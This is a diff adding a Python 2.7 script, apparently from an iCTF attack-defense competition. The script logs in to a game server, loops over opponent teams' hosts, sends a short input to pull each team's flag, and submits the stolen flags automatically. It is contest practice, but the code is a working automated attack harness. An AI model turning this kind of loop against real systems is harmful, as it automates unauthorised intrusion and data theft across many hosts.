@@ -1,0 +1,61 @@
+#!/usr/bin/env python2.7
+# -*- coding: utf-8 -*-
+
+from ictf import iCTF
+import os
+import sys
+import httplib
+import commands
+import re
+import time
+
+from pwn import *
+
+argc = len(sys.argv)
+service_name = []
+service_id = []
+with open("secret.txt", 'r') as f:
+    username = f.readline().strip()
+    passwd = f.readline().strip()
+
+i=iCTF("http://35.167.152.77/")
+
+t = i.login(username,passwd)
+
+services = t.get_service_list()
+
+print "Number of Services are:" + str(len(services))
+
+c_services = []
+for service in services:
+    if service['service_name'].find("c",0,len(service['service_name'])):
+        # print service['service_name']
+        service_name.append(service['service_name'])
+        c_services.append(service['service_id'])
+
+flags = ""
+for elem in c_services:
+    targets = t.get_targets(elem)
+    for target in targets['targets']:
+        hostname  = target['hostname']
+        flag_id = target['flag_id']
+        port = target['port']
+        time.sleep(1)
+        try:
+            conn = remote(hostname,port, timeout=1)
+            conn.recv()
+            conn.sendline("X")
+            conn.recvline()
+            conn.sendline(flag_id)
+            out = conn.recvline()
+            flag = re.findall("\FLG\w+", out)
+            if len(flag) > 0:
+                flag = flag[0]
+                print "************ {0}".format(flag)
+                flags += flag + " "
+                t.submit_flag([flag])
+        except:
+            print "Couldn't attack: {0}".format(hostname)
+        finally:
+            conn.close()
+print flags
